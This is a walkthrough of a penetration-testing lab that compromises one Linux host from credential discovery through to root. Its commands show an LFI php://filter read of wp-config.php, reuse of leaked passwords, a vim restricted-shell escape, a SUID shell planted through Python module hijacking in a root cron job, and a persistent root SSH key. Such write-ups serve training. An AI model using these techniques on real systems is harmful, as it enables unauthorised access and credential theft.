# Reconnaissances
## 172.16.1.10
```
$ proxychains smbclient -L \\172.16.1.10                
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.10:445  ...  OK
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        SlackMigration  Disk      
        IPC$            IPC       IPC Service (DANTE-NIX02 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.10:139  ...  OK
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 172.16.1.10 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

```
```
$ proxychains smbclient \\\\172.16.1.10\\SlackMigration
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Password for [WORKGROUP\kali]:
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.10:445  ...  OK
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 12 10:39:41 2021
  ..                                  D        0  Thu Aug 25 16:43:55 2022
  admintasks.txt                      N      279  Mon May 18 11:24:22 2020

                13758504 blocks of size 1024. 1586480 blocks available
smb: \> get admintasks.txt
getting file \admintasks.txt of size 279 as admintasks.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> 
```
```
$ cat admintasks.txt 
-Remove wordpress install from web root - PENDING
-Reinstate Slack integration on Ubuntu machine - PENDING
-Remove old employee accounts - COMPLETE
-Inform Margaret of the new changes - COMPLETE
-Remove account restrictions on Margarets account post-promotion to admin - PENDING
```

### Download PHP Config
**Try the HTTP Filters**
```
$ proxychains firefox http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```

**Dump wp-config.php**
```
$ proxychains curl "http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php" | base64 -d > wp-config.php
$ cat wp-config.php
```
``` sql
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME' 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'margaret' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

```

### SSH Connect
**User margaret and password Welcome1!2@3#**
```
$ proxychains ssh margaret@172.16.1.10 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.10:22  ...  OK
The authenticity of host '172.16.1.10 (172.16.1.10)' can't be established.
ED25519 key fingerprint is SHA256:f7wic4X2i+93SkY15pQPkzP4FB2ltCqn1YAbTvZvQTY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.1.10' (ED25519) to the list of known hosts.
margaret@172.16.1.10's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

26 updates can be applied immediately.
3 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Fri Mar  1 22:58:55 2024 from 172.16.1.100
You are in a limited shell.
Type '?' or 'help' to get the list of allowed commands
margaret:~$
```

**Break the restricted shell:**
```
margaret:~$ help
cd  clear  exit  help  history  lpath  lsudo  vim
margaret:~$ 
```
```bash
vim
:set shell=/bin/sh
:shell
```
```
$ ls
Desktop  Documents  Downloads  flag.txt  Music  Pictures  Public  snap  Templates  Videos
$ cat flag.txt
DANTE{LF1_M@K3s_u5_lol}
$ ls /home
frank  margaret  nxautomation
```

### Note
From the admintasks.txt said that slack integration task was pending 

**Looking for information that related to Slack.**
```
$ ls -al .config/Slack
total 80
drwxrwxr-x 11 margaret margaret  4096 Apr 12  2021  .
drwxr-xr-x 12 margaret margaret  4096 Apr 12  2021  ..
drwx------  3 margaret margaret  4096 Apr 12  2021  blob_storage
drwx------  3 margaret margaret  4096 Apr 12  2021  Cache
drwx------  3 margaret margaret  4096 Apr 12  2021 'Code Cache'
-rw-------  1 margaret margaret 20480 May 19  2020  Cookies
-rw-------  1 margaret margaret     0 May 19  2020  Cookies-journal
drwxr-xr-x  6 margaret margaret  4096 Apr 12  2021  exported_data
drwx------  2 margaret margaret  4096 Apr 12  2021  GPUCache
-rw-rw-r--  1 margaret margaret    48 May 19  2020  installation
-rw-rw-r--  1 margaret margaret    64 May 19  2020  local-settings.json
drwx------  3 margaret margaret  4096 Apr 12  2021 'Local Storage'
drwx------  3 margaret margaret  4096 Apr 12  2021  logs
-rw-------  1 margaret margaret   355 May 19  2020 'Network Persistent State'
drwx------  2 margaret margaret  4096 Apr 12  2021 'Session Storage'
drwxrwxr-x  2 margaret margaret  4096 Apr 12  2021  storage
-rw-------  1 margaret margaret   405 May 19  2020  TransportSecurity

```
```
$ ls -al .config/Slack/exported_data/
total 40
drwxr-xr-x  6 margaret margaret 4096 Apr 12  2021 .
drwxrwxr-x 11 margaret margaret 4096 Apr 12  2021 ..
-rw-r--r--  1 margaret margaret 2105 May 19  2020 channels.json
-rw-r--r--  1 margaret margaret    4 May 19  2020 integration_logs.json
drwx------  2 margaret margaret 4096 Apr 12  2021 project
drwx------  2 margaret margaret 4096 Apr 12  2021 secure
drwx------  2 margaret margaret 4096 Apr 12  2021 team
-rw-r--r--  1 margaret margaret 4442 May 19  2020 users.json
drwx------  2 margaret margaret 4096 Apr 12  2021 welcome
```
```
$ ls -al .config/Slack/exported_data/secure/                                
total 24
drwx------ 2 margaret margaret  4096 Apr 12  2021 .
drwxr-xr-x 6 margaret margaret  4096 Apr 12  2021 ..
-rw-r--r-- 1 margaret margaret 15022 Mar 23  2021 2020-05-18.json
$ 
```
```
$ cat .config/Slack/exported_data/secure/2020-05-18.json
```

That file contains chat between frank and margaret. Some a necessary text is:
```
text: "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username"
```

Try to use user **frank** with password **TractorHeadtorchDeskmat**
```
$ su frank
Password: 
frank@DANTE-NIX02:/home/margaret$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank)
```

Looking for any necessary file
```
frank@DANTE-NIX02:/home/margaret$ cd
frank@DANTE-NIX02:~$ ls -al
total 92
drwxr-xr-x 19 frank frank 4096 Apr 12  2021 .
drwxr-xr-x  5 root  root  4096 Aug 25  2022 ..
-r--r--r--  1 root  root   198 May 19  2020 apache_restart.py
lrwxrwxrwx  1 root  root     9 Jul 11  2020 .bash_history -> /dev/null
-rw-r--r--  1 frank frank  220 May 18  2020 .bash_logout
-rw-r--r--  1 frank frank 3771 May 18  2020 .bashrc
drwx------ 13 frank frank 4096 Apr 12  2021 .cache
drwxr-xr-x 15 frank frank 4096 Apr 12  2021 .config
drwxr-xr-x  2 frank frank 4096 Apr 12  2021 Desktop
drwxr-xr-x  2 frank frank 4096 Apr 12  2021 Documents
drwxr-xr-x  3 frank frank 4096 Apr 12  2021 Downloads
drwx------  3 frank frank 4096 Aug 24  2022 .gnupg
drwxr-xr-x  3 frank frank 4096 Apr 12  2021 .local
drwx------  5 frank frank 4096 Apr 12  2021 .mozilla
drwxr-xr-x  2 frank frank 4096 Apr 12  2021 Music
drwxr-xr-x  2 frank frank 4096 Apr 12  2021 Pictures
drwx------  3 frank frank 4096 Apr 12  2021 .pki
-rw-r--r--  1 frank frank  807 May 18  2020 .profile
drwxr-xr-x  2 frank frank 4096 Apr 12  2021 Public
drwxr-xr-x  2 root  root  4096 Apr 12  2021 __pycache__
drwx------  4 frank frank 4096 Apr 12  2021 snap
drwx------  2 frank frank 4096 Apr 12  2021 .ssh
-rw-r--r--  1 frank frank    0 May 18  2020 .sudo_as_admin_successful
drwxr-xr-x  2 frank frank 4096 Apr 12  2021 Templates
drwxr-xr-x  2 frank frank 4096 Apr 12  2021 Videos
```

apache_restart.py is belong to root
```
frank@DANTE-NIX02:~$ cat apache_restart.py
```
```Python
import call
import urllib
url = urllib.urlopen(localhost)
page= url.getcode()
if page ==200:
        print ("We're all good!")
else:
        print("We're failing!")
        call(["systemctl start apache2"], shell=True)
```

The script checks the apache2 server service status by sending a GET request to localhost. If the response code is not equal to 200 then it restarts the service. It's worth noting that there is no while loop in the script to repeat the check at regular intervals, which hints that a cronjob may have been configured. We can confirm this by downloading and running pspy.

Download pspy through our local, then share it to 172.16.1.10 via HTTP port.
```
$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
--2024-03-02 05:09:14--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found

$ file pspy64s
pspy64s: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header

```

Listen HTTP in our local
```
python3	-m http.server 80
```

Download it from 172.16.1.10
```bash
frank@DANTE-NIX02:~/Downloads$ curl 10.10.14.2/pspy64s -o pspy64s
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 1129k  100 1129k    0     0   405k      0  0:00:02  0:00:02 --:--:--  405k
frank@DANTE-NIX02:~/Downloads$ ls -al pspy64s 
-rw-rw-r-- 1 frank frank 1156536 Mar  2 02:37 pspy64s
```

Running the pspy64s
```
frank@DANTE-NIX02:~/Downloads$ chmod +x pspy64s 
frank@DANTE-NIX02:~/Downloads$ ./pspy64s -fc
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
```
```
2024/03/02 02:39:01 CMD: UID=0    PID=91199  | python3 /home/frank/apache_restart.py 
2024/03/02 02:39:01 CMD: UID=0    PID=91198  | /bin/sh -c python3 /home/frank/apache_restart.py; sleep 1; rm /home/frank/call.py; sleep 1; rm /home/frank/urllib.py 
2024/03/02 02:39:01 CMD: UID=0    PID=91197  | /usr/sbin/CRON -f 
2024/03/02 02:39:01 CMD: UID=0    PID=91196  | 
```
based on the pspy64s output, `apache_restart.py` is running by root.

### Hijack the urllib modules
Try to create the `urllib.py` file in the same directory with `apache_restart.py` (`/home/frank`). Because Python will load modules in the current working directory first, before looking in the other paths (`/usr/lib/python3.8/`, etc.).
```
nano urllib.py
```

Add the script to duplicate `/bin/sh` with a root privilege 
```
import os
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
```

Running the bash with -p option. It is supplied at invocation, which gives us root access.
```
frank@DANTE-NIX02:~$ /tmp/sh -p
# id
uid=1000(frank) gid=1000(frank) euid=0(root) groups=1000(frank)
```

Add SSH Key
```
# touch /root/.ssh/authorized_keys
# chown root:root /root/.ssh/authorized_keys
# chmod 770 /root/.ssh/authorized_keys
# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEEljGcqu6LAIDeTnlO/+wDg+mB9e+uu2uuxCka/Psu" > /root/.ssh/authorized_keys
```

### SSH Connect
```
$ proxychains ssh -i ~/.ssh/id_ed25519 -D 1080 root@172.16.1.10
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.10:22  ...  OK
bind [127.0.0.1]:1080: Address already in use
channel_setup_fwd_listener_tcpip: cannot listen to port: 1080
Could not request local forwarding.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

26 updates can be applied immediately.
3 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@DANTE-NIX02:~# ls
Desktop  Documents  Downloads  flag.txt  lshell  Music  omsagent-1.14.19-0.universal.x64.sh  Pictures  Public  snap  Templates  Videos
root@DANTE-NIX02:~# cat flag.txt 
DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}
root@DANTE-NIX02:~# 
```